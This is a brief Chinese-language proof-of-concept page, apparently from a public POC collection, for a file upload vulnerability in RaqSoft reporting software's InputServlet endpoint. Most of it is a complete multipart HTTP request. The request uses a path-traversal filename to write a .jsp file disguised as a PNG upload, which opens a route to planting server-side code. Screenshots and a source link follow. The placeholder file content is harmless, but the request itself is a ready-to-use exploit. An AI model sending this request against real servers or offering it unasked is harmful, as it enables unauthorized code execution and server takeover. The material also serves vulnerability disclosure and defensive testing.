## 润乾报表InputServlet接口存在文件上传漏洞

环境：https://github.com/charlesvhe/raqsoft

## poc
```
POST /InputServlet?action=12 HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: multipart/form-data; boundary=--------------------------170005680039721412137562
Accept-Encoding: gzip, deflate, br
Content-Length: 2401

----------------------------170005680039721412137562
Content-Disposition: form-data; name="upsize"

1024
----------------------------170005680039721412137562
Content-Disposition: form-data; name="file"; filename="/\..\\..\2.jsp"
Content-Type: image/png

11111
----------------------------170005680039721412137562--

```

![image](https://github.com/wy876/POC/assets/139549762/040e8f76-a72c-47db-a161-d14cab5db001)

![image](https://github.com/wy876/POC/assets/139549762/bea567d7-6648-4cbe-990a-8fbb876d7660)


## 漏洞来源
- https://mp.weixin.qq.com/s/-u1fn_q4e-YhJUEqwNG1Zg
